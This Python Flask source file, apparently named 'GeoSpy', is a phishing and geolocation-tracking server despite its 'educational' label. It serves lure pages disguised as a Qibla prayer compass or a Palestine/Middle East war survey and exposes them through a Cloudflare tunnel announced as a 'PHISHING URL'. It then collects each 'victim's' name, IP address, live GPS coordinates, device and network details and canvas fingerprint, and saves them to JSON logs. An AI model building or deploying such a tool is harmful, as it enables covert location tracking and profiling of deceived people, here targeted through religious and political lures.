#!/usr/bin/env python3
"""
GeoSpy - Educational Awareness Tool
Supports: Qibla Compass | War Survey
"""

import os, re, json, platform, shutil, subprocess, sys, threading, time
from datetime import datetime
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
LOGS_DIR = 'logs'
os.makedirs(LOGS_DIR, exist_ok=True)
victim_count = [0]

MODE = 'survey'   # 'survey' or 'qibla'

LANGS = {
    'en':'English','ml':'Malayalam','id':'Indonesian',
    'ar':'Arabic','fr':'French','tr':'Turkish'
}

# ── Colors ────────────────────────────────────────
GD  = '\033[1;33m'
G2  = '\033[0;33m'
WH  = '\033[1;97m'
DM  = '\033[0;37m'
YL  = '\033[1;93m'
RD  = '\033[1;91m'
CY  = '\033[1;96m'
GR  = '\033[1;92m'
MG  = '\033[1;95m'
RS  = '\033[0m'
BD  = '\033[1m'

def ts(): return time.strftime('%H:%M:%S')

def log(msg, level='info'):
    icons = {'info':f'{G2}[{GD}*{G2}]{RS}','ok':f'{G2}[{GD}+{G2}]{RS}','warn':f'{G2}[{YL}!{G2}]{RS}','error':f'{G2}[{RD}ERR{G2}]{RS}'}
    print(f"{DM}[{ts()}]{RS} {icons.get(level,icons['info'])} {WH}{msg}{RS}")

def get_w():
    return max(60, min(120, shutil.get_terminal_size(fallback=(80,24)).columns - 4))

def ansi_len(s):
    return len(re.sub(r'\033\[[0-9;]*m','',s))

def gd_top():    print(f"{G2}  ◆{'─'*get_w()}◆{RS}")
def gd_bot():    print(f"{G2}  ◆{'─'*get_w()}◆{RS}")

def gd_sep(label=''):
    w = get_w()
    if label:
        tag = f" // {label} "; line = '─'*((w-len(tag))//2)
        print(f"{G2}  {line}{GD}{tag}{G2}{line}─{RS}")
    else:
        print(f"{G2}  {'─'*w}{RS}")

def gd_title(text):
    w = get_w()
    inner = f"  {GD}{BD}>> {text}{RS}"
    pad = w - ansi_len(inner) + 2
    print(f"{G2}  │{inner}{' '*max(0,pad)}{G2}│{RS}")

def gd_row(label, value, color=None):
    w = get_w(); c = color or WH
    vw = w - 22; v = str(value)[:vw]
    inner = f"  {G2}{label:<13}{DM}::{RS}  {c}{v}{RS}"
    pad = w - ansi_len(inner) + 2
    print(f"{G2}  │{inner}{' '*max(0,pad)}{G2}│{RS}")

def gd_denied(msg):
    w = get_w()
    inner = f"  {RD}{msg}{RS}"
    pad = w - ansi_len(inner) + 2
    print(f"{G2}  │{inner}{' '*max(0,pad)}{G2}│{RS}")

def detect_arch():
    m = platform.machine().lower()
    if 'aarch64' in m or 'arm64' in m: return 'aarch64'
    if 'x86_64'  in m or 'amd64'  in m: return 'amd64'
    if 'arm' in m: return 'arm'
    return 'amd64'

def install_cloudflared():
    arch = detect_arch()
    urls = {'aarch64':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','amd64':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','arm':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'}
    try:
        subprocess.run(['wget','-q','-O','/tmp/cloudflared',urls[arch]],check=True)
        subprocess.run(['chmod','+x','/tmp/cloudflared'],check=True)
        subprocess.run(['sudo','mv','/tmp/cloudflared','/usr/local/bin/cloudflared'],check=True)
        log("cloudflared installed!",'ok'); return True
    except Exception as e:
        log(f"Install failed: {e}",'error'); return False

def ensure_cloudflared():
    if subprocess.run(['which','cloudflared'],capture_output=True).returncode == 0: return True
    log("cloudflared not found — installing...",'warn')
    return install_cloudflared()

def radar_frame(i):
    frames = [["  . . . . .","  . . | . .","  . - + - .","  . . | . .","  . . . . ."],["  . . . . .","  . . / . .","  . . + . .","  . . . \\ .","  . . . . ."],["  . . . . .","  . . . . .","  . - + - .","  . . . . .","  . . . . ."],["  . . . . .","  . \\ . . .","  . . + . .","  . . . / .","  . . . . ."]]
    for line in frames[i%4]: print(f"  {GD}{line}{RS}")

def boot_sequence():
    import random
    steps = ["LOADING GEOSPY ENGINE","INITIALIZING TRACKER","SETTING UP FLASK","PREPARING LOGS DIR","DETECTING ARCH","CHECKING CLOUDFLARED","READY"]
    for i, step in enumerate(steps):
        os.system('clear'); print()
        radar_frame(i)
        print(f"\n  {GD}{BD}◆ GEOSPY — BOOT SEQUENCE ◆{RS}\n")
        for j,s in enumerate(steps):
            if j<i:    print(f"  {G2}[{GD}+{G2}]{RS} {DM}{s:<35}{GD} OK{RS}")
            elif j==i: print(f"  {G2}[{YL}>{G2}]{RS} {WH}{s:<35}{YL} LOADING...{RS}")
            else:      print(f"  {DM}[ ] {s}{RS}")
        time.sleep(random.uniform(0.07,0.16))
    time.sleep(0.3); os.system('clear')
    print(f"\n  {GD}{BD}◆◆ SYSTEM READY ◆◆{RS}\n"); time.sleep(0.5); os.system('clear')

def select_mode():
    global MODE
    os.system('clear')
    print(f"""
{GD}{BD}   ██████╗ ███████╗ ██████╗ ███████╗██████╗ ██╗   ██╗
  ██╔════╝ ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚██╗ ██╔╝
  ██║  ███╗█████╗  ██║   ██║███████╗██████╔╝ ╚████╔╝
  ██║   ██║██╔══╝  ██║   ██║╚════██║██╔═══╝   ╚██╔╝
  ╚██████╔╝███████╗╚██████╔╝███████║██║        ██║
   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝        ╚═╝{RS}
""")
    gd_top()
    gd_title('GEOSPY v2.0 — SELECT MODE')
    gd_sep()
    gd_row('[ 1 ]', 'War Survey      — Palestine / Middle East Opinion Poll', CY)
    gd_row('[ 2 ]', 'Qibla Compass   — Prayer Times + Qibla Direction',        MG)
    gd_sep()
    gd_row('ARCH',    detect_arch().upper(), YL)
    gd_row('WARNING', 'EDUCATIONAL USE ONLY', RD)
    gd_bot(); print()
    while True:
        try:
            c = input(f"  {GD}>> Enter choice [1/2]: {RS}").strip()
            if c == '1':   MODE='survey'; print(f"  {CY}✓ Mode: WAR SURVEY{RS}\n");    break
            elif c == '2': MODE='qibla';  print(f"  {MG}✓ Mode: QIBLA COMPASS{RS}\n"); break
            else: print(f"  {RD}Invalid — enter 1 or 2{RS}")
        except KeyboardInterrupt:
            print(f"\n  {RD}Exiting.{RS}"); sys.exit(0)
    time.sleep(0.5)

def print_banner():
    label = 'WAR SURVEY' if MODE=='survey' else 'QIBLA COMPASS'
    color = CY if MODE=='survey' else MG
    print()
    gd_top()
    gd_row('TOOL',   'GEOSPY v2.0',       GD)
    gd_row('MODE',   label,               color)
    gd_row('ARCH',   detect_arch().upper(),YL)
    gd_row('STATUS', '[ ACTIVE ]',        GR)
    gd_row('WARN',   'EDUCATIONAL ONLY',  RD)
    gd_bot(); print()

def start_cloudflared():
    if not ensure_cloudflared(): log("Could not start tunnel",'error'); return
    log("Starting Cloudflare tunnel...",'info')
    try:
        proc = subprocess.Popen(['cloudflared','tunnel','--url','http://localhost:5000'],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        for line in proc.stderr:
            decoded = line.decode('utf-8',errors='ignore')
            m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com',decoded)
            if m:
                url=m.group(0); print()
                gd_top(); gd_title('PHISHING URL READY'); gd_sep()
                gd_row('URL',url,GD); gd_bot(); print(); break
    except Exception as e:
        log(f"Tunnel error: {e}",'error')

def print_hit(data):
    victim_count[0] += 1
    dev  = data.get('device',{})
    gps  = data.get('gps')
    bat  = dev.get('battery',{})
    net  = dev.get('network',{})
    ans  = data.get('answers',{})
    name = dev.get('name','Unknown')
    lang = dev.get('lang','en')
    src  = data.get('source','survey')
    lang_label = LANGS.get(lang, lang.upper())
    print()
    gd_top()
    tag = 'QIBLA HIT' if 'qibla' in src else 'SURVEY HIT'
    gd_title(f"VICTIM #{victim_count[0]} — {tag}")
    gd_sep('IDENTITY')
    gd_row('NAME',      name,         GR)
    gd_row('LANGUAGE',  lang_label,   YL)
    gd_row('IP',        dev.get('ip','unknown'), WH)
    gd_row('TIMESTAMP', data.get('timestamp','N/A'), CY)
    gd_row('SOURCE',    src,          MG)
    gd_sep('GPS')
    if gps:
        lat=gps.get('lat','N/A'); lon=gps.get('lon','N/A')
        gd_row('LATITUDE',  lat,  CY)
        gd_row('LONGITUDE', lon,  CY)
        gd_row('ACCURACY',  f"{gps.get('accuracy','N/A')}m")
        gd_row('ALTITUDE',  gps.get('altitude','N/A'))
        gd_row('SPEED',     gps.get('speed','N/A'))
        gd_row('MAPS',      f"https://maps.google.com/?q={lat},{lon}", GD)
    else:
        gd_denied('GPS  ::  DENIED / UNAVAILABLE')
    gd_sep('NETWORK')
    gd_row('NET TYPE', net.get('type','N/A'))
    gd_row('DOWNLINK', net.get('downlink','N/A'))
    gd_row('RTT',      net.get('rtt','N/A'))
    gd_sep('BATTERY')
    gd_row('LEVEL',    bat.get('level','N/A'), GR)
    gd_row('CHARGING', bat.get('charging','N/A'))
    gd_sep('DEVICE')
    gd_row('PLATFORM',  dev.get('platform','N/A'))
    gd_row('SCREEN',    dev.get('screenSize','N/A'))
    gd_row('CPU CORES', dev.get('cpuCores','N/A'))
    gd_row('MEMORY',    dev.get('deviceMemory','N/A'))
    gd_row('TIMEZONE',  dev.get('timezone','N/A'))
    gd_row('LANG SYS',  dev.get('language','N/A'))
    gd_row('CANVAS FP', dev.get('canvasFingerprint','N/A'), DM)
    if ans:
        gd_sep('SURVEY ANSWERS')
        for key,val in ans.items():
            q=str(val.get('question',''))[:28]; a=str(val.get('answer',''))
            gd_row(q,a,YL)
    gd_bot(); print()

# ── ROUTES ───────────────────────────────────────
@app.after_request
def cors(r):
    r.headers['Access-Control-Allow-Origin']='*'
    r.headers['Access-Control-Allow-Headers']='Content-Type'
    r.headers['Access-Control-Allow-Methods']='GET,POST,OPTIONS'
    return r

@app.route('/')
def index():
    if MODE=='qibla': return render_template('qibla.html')
    return render_template('index.html')

@app.route('/name', methods=['POST','OPTIONS'])
def name_route():
    if request.method=='OPTIONS': return jsonify({'status':'ok'})
    try:
        data=request.get_json(force=True,silent=True) or {}
        name=data.get('name','Unknown'); lang=data.get('lang','en')
        ll=LANGS.get(lang,lang.upper())
        print()
        gd_top(); gd_title('NEW VICTIM — NAME CAPTURED'); gd_sep()
        gd_row('NAME',name,GR); gd_row('LANGUAGE',ll,YL)
        gd_row('TIME',data.get('timestamp','N/A'),CY)
        gd_row('IP',request.remote_addr,WH)
        gd_bot(); print()
        return jsonify({'status':'ok'})
    except Exception as e:
        log(f"Name error: {e}",'error'); return jsonify({'status':'error'}),500

@app.route('/update', methods=['POST','OPTIONS'])
def update():
    if request.method=='OPTIONS': return jsonify({'status':'ok'})
    try:
        data=request.get_json(force=True,silent=True)
        if not data: return jsonify({'status':'error'}),400
        lat=data.get('lat','N/A'); lon=data.get('lon','N/A')
        gd_sep('LIVE UPDATE')
        gd_row('TIME',data.get('timestamp','N/A'),CY)
        gd_row('LATITUDE',lat,CY); gd_row('LONGITUDE',lon,CY)
        gd_row('ACCURACY',f"{data.get('accuracy','N/A')}m")
        gd_row('MAPS',f"https://maps.google.com/?q={lat},{lon}",GD)
        gd_sep()
        return jsonify({'status':'ok'})
    except Exception as e:
        log(f"Update error: {e}",'error'); return jsonify({'status':'error'}),500

@app.route('/collect', methods=['POST','OPTIONS'])
def collect():
    if request.method=='OPTIONS': return jsonify({'status':'ok'})
    try:
        data=request.get_json(force=True,silent=True)
        if not data: return jsonify({'status':'error'}),400
        data['server_ip']=request.remote_addr
        print_hit(data)
        fname=f"{LOGS_DIR}/victim_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{victim_count[0]}.json"
        with open(fname,'w') as f: json.dump(data,f,indent=2)
        log(f"Saved → {fname}",'ok')
        return jsonify({'status':'ok'})
    except Exception as e:
        log(f"Collect error: {e}",'error'); return jsonify({'status':'error','msg':str(e)}),500

# ── MAIN ─────────────────────────────────────────
if __name__=='__main__':
    boot_sequence()
    select_mode()
    os.system('clear')
    print_banner()
    log(f"Mode       : {MODE.upper()}",'ok');          time.sleep(0.15)
    log(f"Arch       : {detect_arch().upper()}",'ok'); time.sleep(0.15)
    log(f"Logs       : {os.path.abspath(LOGS_DIR)}",'ok'); time.sleep(0.15)
    log("Flask      : 0.0.0.0:5000",'ok');              time.sleep(0.15)
    threading.Thread(target=start_cloudflared,daemon=True).start()
    time.sleep(0.5); log("Waiting for Cloudflare tunnel...",'info'); print()
    app.run(host='0.0.0.0',port=5000,debug=False)
